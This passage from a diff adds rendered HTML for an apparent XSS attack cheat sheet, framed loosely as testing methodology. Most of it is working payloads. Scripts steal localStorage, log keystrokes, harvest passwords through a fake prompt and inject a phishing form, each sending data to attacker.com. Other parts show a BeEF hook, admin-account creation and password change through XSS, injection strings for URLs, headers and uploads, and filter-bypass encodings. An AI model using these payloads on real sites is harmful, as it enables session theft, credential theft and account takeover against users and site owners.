+</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a>
+</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a><span class="c1">// Steal localStorage</span>
+</span><span id="__span-29-7"><a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+</span><span id="__span-29-8"><a id="__codelineno-29-8" name="__codelineno-29-8" href="#__codelineno-29-8"></a><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;http://attacker.com/log?data=&#39;</span><span class="o">+</span><span class="nx">btoa</span><span class="p">(</span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">localStorage</span><span class="p">)))</span>
+</span><span id="__span-29-9"><a id="__codelineno-29-9" name="__codelineno-29-9" href="#__codelineno-29-9"></a><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></code></pre></div>
+<h3 id="3-keylogger">3. Keylogger</h3>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="nb">document</span><span class="p">.</span><span class="nx">onkeypress</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a><span class="w">    </span><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;http://attacker.com/log?key=&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">e</span><span class="p">.</span><span class="nx">key</span><span class="p">);</span>
+</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a><span class="p">}</span>
+</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></code></pre></div>
+<h3 id="4-credential-harvesting">4. Credential Harvesting</h3>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a><span class="kd">var</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">prompt</span><span class="p">(</span><span class="s1">&#39;Session expired. Please re-enter password:&#39;</span><span class="p">);</span>
+</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;http://attacker.com/log?pass=&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">password</span><span class="p">);</span>
+</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></code></pre></div>
+<h3 id="5-phishing-page-injection">5. Phishing Page Injection</h3>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&lt;h1&gt;Login Required&lt;/h1&gt;&lt;form action=&quot;http://attacker.com/phish.php&quot; method=&quot;POST&quot;&gt;&lt;input name=&quot;user&quot; placeholder=&quot;Username&quot;&gt;&lt;input name=&quot;pass&quot; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;&lt;/form&gt;&#39;</span><span class="p">;</span>
+</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></code></pre></div>
+<h3 id="6-beef-hook">6. BeEF Hook</h3>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;http://attacker.com:3000/hook.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></code></pre></div>
+<h3 id="7-admin-action-exploitation">7. Admin Action Exploitation</h3>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="c1">// If XSS in admin panel, perform actions</span>
+</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a><span class="c1">// Add new admin user</span>
+</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/admin/users/add&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a><span class="w">    </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="p">,</span>
+</span><span id="__span-34-6"><a id="__codelineno-34-6" name="__codelineno-34-6" href="#__codelineno-34-6"></a><span class="w">    </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;username=hacker&amp;password=Passw0rd!&amp;role=admin&#39;</span>
+</span><span id="__span-34-7"><a id="__codelineno-34-7" name="__codelineno-34-7" href="#__codelineno-34-7"></a><span class="p">});</span>
+</span><span id="__span-34-8"><a id="__codelineno-34-8" name="__codelineno-34-8" href="#__codelineno-34-8"></a><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span><span id="__span-34-9"><a id="__codelineno-34-9" name="__codelineno-34-9" href="#__codelineno-34-9"></a>
+</span><span id="__span-34-10"><a id="__codelineno-34-10" name="__codelineno-34-10" href="#__codelineno-34-10"></a><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+</span><span id="__span-34-11"><a id="__codelineno-34-11" name="__codelineno-34-11" href="#__codelineno-34-11"></a><span class="c1">// Change admin password</span>
+</span><span id="__span-34-12"><a id="__codelineno-34-12" name="__codelineno-34-12" href="#__codelineno-34-12"></a><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/admin/change-password&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-34-13"><a id="__codelineno-34-13" name="__codelineno-34-13" href="#__codelineno-34-13"></a><span class="w">    </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="p">,</span><span class="w"> </span>
+</span><span id="__span-34-14"><a id="__codelineno-34-14" name="__codelineno-34-14" href="#__codelineno-34-14"></a><span class="w">    </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;newpass=hacked123&#39;</span>
+</span><span id="__span-34-15"><a id="__codelineno-34-15" name="__codelineno-34-15" href="#__codelineno-34-15"></a><span class="p">});</span>
+</span><span id="__span-34-16"><a id="__codelineno-34-16" name="__codelineno-34-16" href="#__codelineno-34-16"></a><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></code></pre></div>
+<hr />
+<h2 id="testing-methodology">Testing Methodology</h2>
+<h3 id="step-1-map-input-points">Step 1: Map Input Points</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="c1"># Identify all input vectors</span>
+</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>-<span class="w"> </span>URL<span class="w"> </span>parameters:<span class="w"> </span>?id<span class="o">=</span>,<span class="w"> </span>?search<span class="o">=</span>,<span class="w"> </span>?page<span class="o">=</span>
+</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a>-<span class="w"> </span>POST<span class="w"> </span>body<span class="w"> </span>parameters
+</span><span id="__span-35-4"><a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a>-<span class="w"> </span>HTTP<span class="w"> </span>headers
+</span><span id="__span-35-5"><a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a>-<span class="w"> </span>File<span class="w"> </span>uploads<span class="w"> </span><span class="o">(</span>filename,<span class="w"> </span>metadata<span class="o">)</span>
+</span><span id="__span-35-6"><a id="__codelineno-35-6" name="__codelineno-35-6" href="#__codelineno-35-6"></a>-<span class="w"> </span>JSON/XML<span class="w"> </span>payloads
+</span><span id="__span-35-7"><a id="__codelineno-35-7" name="__codelineno-35-7" href="#__codelineno-35-7"></a>-<span class="w"> </span>Cookies
+</span></code></pre></div>
+<h3 id="step-2-test-basic-payloads">Step 2: Test Basic Payloads</h3>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a># Start simple
+</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a>
+</span><span id="__span-36-5"><a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a># Check response for:
+</span><span id="__span-36-6"><a id="__codelineno-36-6" name="__codelineno-36-6" href="#__codelineno-36-6"></a>- Is input reflected?
+</span><span id="__span-36-7"><a id="__codelineno-36-7" name="__codelineno-36-7" href="#__codelineno-36-7"></a>- What context (HTML/JS/attribute)?
+</span><span id="__span-36-8"><a id="__codelineno-36-8" name="__codelineno-36-8" href="#__codelineno-36-8"></a>- Are characters filtered/encoded?
+</span></code></pre></div>
+<h3 id="step-3-determine-context">Step 3: Determine Context</h3>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a># HTML Context
+</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>- Payload appears in <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>, <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>, <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>, etc.
+</span><span id="__span-37-3"><a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a>- Use: <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;,</span><span class="w"> </span><span class="o">&lt;</span><span class="nx">img</span><span class="o">&gt;</span><span class="p">,</span><span class="w"> </span><span class="o">&lt;</span><span class="nx">svg</span><span class="o">&gt;</span>
+</span><span id="__span-37-4"><a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a>
+</span><span id="__span-37-5"><a id="__codelineno-37-5" name="__codelineno-37-5" href="#__codelineno-37-5"></a># Attribute Context  
+</span><span id="__span-37-6"><a id="__codelineno-37-6" name="__codelineno-37-6" href="#__codelineno-37-6"></a>- Payload inside: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;HERE&quot;</span><span class="p">&gt;</span>
+</span><span id="__span-37-7"><a id="__codelineno-37-7" name="__codelineno-37-7" href="#__codelineno-37-7"></a>- Use: &quot; onerror=&quot;alert(1)
+</span><span id="__span-37-8"><a id="__codelineno-37-8" name="__codelineno-37-8" href="#__codelineno-37-8"></a>
+</span><span id="__span-37-9"><a id="__codelineno-37-9" name="__codelineno-37-9" href="#__codelineno-37-9"></a># JavaScript Context
+</span><span id="__span-37-10"><a id="__codelineno-37-10" name="__codelineno-37-10" href="#__codelineno-37-10"></a>- Payload inside: var x = &#39;HERE&#39;;
+</span><span id="__span-37-11"><a id="__codelineno-37-11" name="__codelineno-37-11" href="#__codelineno-37-11"></a>- Use: &#39;; alert(1); //
+</span></code></pre></div>
+<h3 id="step-4-bypass-filters">Step 4: Bypass Filters</h3>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a># Test if filters exist:
+</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a>1. Try <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">blocked</span><span class="o">?</span>
+</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a>2. Try <span class="p">&lt;</span><span class="nt">img</span><span class="p">&gt;</span> - blocked?
+</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a>3. Try encoding - works?
+</span><span id="__span-38-5"><a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a>4. Try case variation - works?
+</span><span id="__span-38-6"><a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a>5. Try alternative tags
+</span></code></pre></div>
+<h3 id="step-5-craft-final-exploit">Step 5: Craft Final Exploit</h3>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a># Create working payload that:
+</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a>- Bypasses all filters
+</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a>- Executes in correct context
+</span><span id="__span-39-4"><a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a>- Achieves objective (steal cookie, etc.)
+</span></code></pre></div>
+<hr />
+<h2 id="tools-for-xss-testing">Tools for XSS Testing</h2>
+<h3 id="manual-testing">Manual Testing</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="c1"># Burp Suite</span>
+</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>-<span class="w"> </span>Intercept<span class="w"> </span>requests
+</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a>-<span class="w"> </span>Modify<span class="w"> </span>parameters
+</span><span id="__span-40-4"><a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a>-<span class="w"> </span>Test<span class="w"> </span>payloads<span class="w"> </span>systematically
+</span><span id="__span-40-5"><a id="__codelineno-40-5" name="__codelineno-40-5" href="#__codelineno-40-5"></a>
+</span><span id="__span-40-6"><a id="__codelineno-40-6" name="__codelineno-40-6" href="#__codelineno-40-6"></a><span class="c1"># Browser DevTools</span>
+</span><span id="__span-40-7"><a id="__codelineno-40-7" name="__codelineno-40-7" href="#__codelineno-40-7"></a>-<span class="w"> </span>Check<span class="w"> </span>JavaScript<span class="w"> </span>console<span class="w"> </span><span class="k">for</span><span class="w"> </span>errors
+</span><span id="__span-40-8"><a id="__codelineno-40-8" name="__codelineno-40-8" href="#__codelineno-40-8"></a>-<span class="w"> </span>Inspect<span class="w"> </span>HTML<span class="w"> </span>to<span class="w"> </span>see<span class="w"> </span>where<span class="w"> </span>input<span class="w"> </span>is<span class="w"> </span>reflected
+</span><span id="__span-40-9"><a id="__codelineno-40-9" name="__codelineno-40-9" href="#__codelineno-40-9"></a>-<span class="w"> </span>Monitor<span class="w"> </span>network<span class="w"> </span>tab<span class="w"> </span><span class="k">for</span><span class="w"> </span>requests
+</span><span id="__span-40-10"><a id="__codelineno-40-10" name="__codelineno-40-10" href="#__codelineno-40-10"></a>
+</span><span id="__span-40-11"><a id="__codelineno-40-11" name="__codelineno-40-11" href="#__codelineno-40-11"></a><span class="c1"># cURL</span>
+</span><span id="__span-40-12"><a id="__codelineno-40-12" name="__codelineno-40-12" href="#__codelineno-40-12"></a>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://target.com/comment<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-40-13"><a id="__codelineno-40-13" name="__codelineno-40-13" href="#__codelineno-40-13"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;comment=&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>
+</span><span id="__span-40-14"><a id="__codelineno-40-14" name="__codelineno-40-14" href="#__codelineno-40-14"></a>
+</span><span id="__span-40-15"><a id="__codelineno-40-15" name="__codelineno-40-15" href="#__codelineno-40-15"></a>curl<span class="w"> </span><span class="s2">&quot;http://target.com/search?q=&lt;img src=x onerror=alert(1)&gt;&quot;</span>
+</span></code></pre></div>
+<h3 id="automated-tools">Automated Tools</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="c1"># XSSer</span>
+</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a>xsser<span class="w"> </span>--url<span class="w"> </span><span class="s2">&quot;http://target.com/page?id=XSS&quot;</span>
+</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a>xsser<span class="w"> </span>--url<span class="w"> </span><span class="s2">&quot;http://target.com/page&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;name=XSS&amp;email=test@test.com&quot;</span>
+</span><span id="__span-41-4"><a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a>
+</span><span id="__span-41-5"><a id="__codelineno-41-5" name="__codelineno-41-5" href="#__codelineno-41-5"></a><span class="c1"># dalfox</span>
+</span><span id="__span-41-6"><a id="__codelineno-41-6" name="__codelineno-41-6" href="#__codelineno-41-6"></a>dalfox<span class="w"> </span>url<span class="w"> </span>http://target.com/page?id<span class="o">=</span><span class="m">1</span>
+</span><span id="__span-41-7"><a id="__codelineno-41-7" name="__codelineno-41-7" href="#__codelineno-41-7"></a>dalfox<span class="w"> </span>file<span class="w"> </span>urls.txt
+</span><span id="__span-41-8"><a id="__codelineno-41-8" name="__codelineno-41-8" href="#__codelineno-41-8"></a>
+</span><span id="__span-41-9"><a id="__codelineno-41-9" name="__codelineno-41-9" href="#__codelineno-41-9"></a><span class="c1"># XSStrike</span>
+</span><span id="__span-41-10"><a id="__codelineno-41-10" name="__codelineno-41-10" href="#__codelineno-41-10"></a>python3<span class="w"> </span>xsstrike.py<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com/page?id=1&quot;</span>
+</span></code></pre></div>
+<hr />
+<h2 id="common-injection-points">Common Injection Points</h2>
+<h3 id="url-parameters">URL Parameters</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>http://target.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;
+</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>http://target.com/page?name=&lt;img src=x onerror=alert(1)&gt;
+</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a>http://target.com/profile?user=admin&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</span></code></pre></div>
+<h3 id="form-inputs">Form Inputs</h3>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="cm">&lt;!-- Search boxes --&gt;</span>
+</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;search&quot;</span><span class="p">&gt;</span>
+</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a>Payload: <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-43-4"><a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a>
+</span><span id="__span-43-5"><a id="__codelineno-43-5" name="__codelineno-43-5" href="#__codelineno-43-5"></a><span class="cm">&lt;!-- Comment sections --&gt;</span>
+</span><span id="__span-43-6"><a id="__codelineno-43-6" name="__codelineno-43-6" href="#__codelineno-43-6"></a><span class="p">&lt;</span><span class="nt">textarea</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;comment&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">textarea</span><span class="p">&gt;</span>
+</span><span id="__span-43-7"><a id="__codelineno-43-7" name="__codelineno-43-7" href="#__codelineno-43-7"></a>Payload: <span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">alert(document.cookie)</span><span class="p">&gt;</span>
+</span><span id="__span-43-8"><a id="__codelineno-43-8" name="__codelineno-43-8" href="#__codelineno-43-8"></a>
+</span><span id="__span-43-9"><a id="__codelineno-43-9" name="__codelineno-43-9" href="#__codelineno-43-9"></a><span class="cm">&lt;!-- User profiles --&gt;</span>
+</span><span id="__span-43-10"><a id="__codelineno-43-10" name="__codelineno-43-10" href="#__codelineno-43-10"></a>Name: <span class="p">&lt;</span><span class="nt">svg</span> <span class="na">onload</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+</span><span id="__span-43-11"><a id="__codelineno-43-11" name="__codelineno-43-11" href="#__codelineno-43-11"></a>Bio: <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></code></pre></div>
+<h3 id="http-headers">HTTP Headers</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="c1"># User-Agent</span>
+</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a>curl<span class="w"> </span>-A<span class="w"> </span><span class="s2">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span><span class="w"> </span>http://target.com
+</span><span id="__span-44-3"><a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a>
+</span><span id="__span-44-4"><a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a><span class="c1"># Referer</span>
+</span><span id="__span-44-5"><a id="__codelineno-44-5" name="__codelineno-44-5" href="#__codelineno-44-5"></a>curl<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Referer: &lt;script&gt;alert(1)&lt;/script&gt;&quot;</span><span class="w"> </span>http://target.com
+</span><span id="__span-44-6"><a id="__codelineno-44-6" name="__codelineno-44-6" href="#__codelineno-44-6"></a>
+</span><span id="__span-44-7"><a id="__codelineno-44-7" name="__codelineno-44-7" href="#__codelineno-44-7"></a><span class="c1"># Cookie</span>
+</span><span id="__span-44-8"><a id="__codelineno-44-8" name="__codelineno-44-8" href="#__codelineno-44-8"></a>curl<span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;user=&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span><span class="w"> </span>http://target.com
+</span><span id="__span-44-9"><a id="__codelineno-44-9" name="__codelineno-44-9" href="#__codelineno-44-9"></a>
+</span><span id="__span-44-10"><a id="__codelineno-44-10" name="__codelineno-44-10" href="#__codelineno-44-10"></a><span class="c1"># X-Forwarded-For</span>
+</span><span id="__span-44-11"><a id="__codelineno-44-11" name="__codelineno-44-11" href="#__codelineno-44-11"></a>curl<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;X-Forwarded-For: &lt;script&gt;alert(1)&lt;/script&gt;&quot;</span><span class="w"> </span>http://target.com
+</span></code></pre></div>
+<h3 id="file-uploads">File Uploads</h3>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="cm">&lt;!-- Filename XSS --&gt;</span>
+</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a>Filename: test<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>.jpg
+</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a>Filename: &quot;&gt;<span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>.jpg
+</span><span id="__span-45-4"><a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a>
+</span><span id="__span-45-5"><a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a><span class="cm">&lt;!-- SVG file content --&gt;</span>
+</span><span id="__span-45-6"><a id="__codelineno-45-6" name="__codelineno-45-6" href="#__codelineno-45-6"></a><span class="p">&lt;</span><span class="nt">svg</span> <span class="na">xmlns</span><span class="o">=</span><span class="s">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="na">onload</span><span class="o">=</span><span class="s">&quot;alert(1)&quot;</span><span class="p">/&gt;</span>
+</span><span id="__span-45-7"><a id="__codelineno-45-7" name="__codelineno-45-7" href="#__codelineno-45-7"></a>
+</span><span id="__span-45-8"><a id="__codelineno-45-8" name="__codelineno-45-8" href="#__codelineno-45-8"></a><span class="cm">&lt;!-- HTML file upload --&gt;</span>
+</span><span id="__span-45-9"><a id="__codelineno-45-9" name="__codelineno-45-9" href="#__codelineno-45-9"></a><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span><span id="__span-45-10"><a id="__codelineno-45-10" name="__codelineno-45-10" href="#__codelineno-45-10"></a><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span><span id="__span-45-11"><a id="__codelineno-45-11" name="__codelineno-45-11" href="#__codelineno-45-11"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-45-12"><a id="__codelineno-45-12" name="__codelineno-45-12" href="#__codelineno-45-12"></a><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span><span id="__span-45-13"><a id="__codelineno-45-13" name="__codelineno-45-13" href="#__codelineno-45-13"></a><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></code></pre></div>
+<hr />
+<h2 id="waf-bypass-techniques">WAF Bypass Techniques</h2>
+<h3 id="1-character-encoding-bypass">1. Character Encoding Bypass</h3>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="mf">88</span><span class="p">,</span><span class="mf">83</span><span class="p">,</span><span class="mf">83</span><span class="p">))&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
